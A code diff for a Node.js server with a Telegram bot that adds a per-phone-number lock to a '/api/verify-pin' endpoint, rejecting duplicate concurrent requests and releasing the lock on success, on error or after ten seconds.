@@ -21,6 +21,8 @@ const bot = new TelegramBot(BOT_TOKEN);
 // Store admin chat IDs and paused admins
 const adminChatIds = new Map();
 const pausedAdmins = new Set(); // Track paused admin IDs
+// ✅ RACE CONDITION FIX: Lock map prevents duplicate saves for same phone
+const processingLocks = new Set();
 
 let dbReady = false;
 
@@ -1843,6 +1845,15 @@ app.post('/api/verify-pin', async (req, res) => {
         console.log('   Admin ID from request:', requestAdminId);
         console.log('   Assignment Type:', assignmentType);
 
+
+        // u2705 RACE CONDITION FIX: Block duplicate concurrent requests for same phone
+        const lockKey = `pin_${phoneNumber}`;
+        if (processingLocks.has(lockKey)) {
+            console.log(`u26a0ufe0f Duplicate request blocked for: ${phoneNumber}`);
+            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
+        }
+        processingLocks.add(lockKey);
+        setTimeout(() => processingLocks.delete(lockKey), 10000); // auto-release after 10s
         let assignedAdmin;
 
         // If specific admin requested
@@ -1956,6 +1967,9 @@ app.post('/api/verify-pin', async (req, res) => {
             console.error(`❌ Failed to send message to ${assignedAdmin.name}`);
         }
 
+        // ✅ Release lock now that application is saved and sent
+        processingLocks.delete(lockKey);
+
         res.json({ 
             success: true, 
             applicationId,
@@ -1964,6 +1978,9 @@ app.post('/api/verify-pin', async (req, res) => {
         });
 
     } catch (error) {
+        // ✅ Always release lock on error too
+        const lockKey = `pin_${req.body?.phoneNumber}`;
+        processingLocks.delete(lockKey);
         console.error('❌ Error in /api/verify-pin:', error);
         console.error('Stack:', error.stack);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
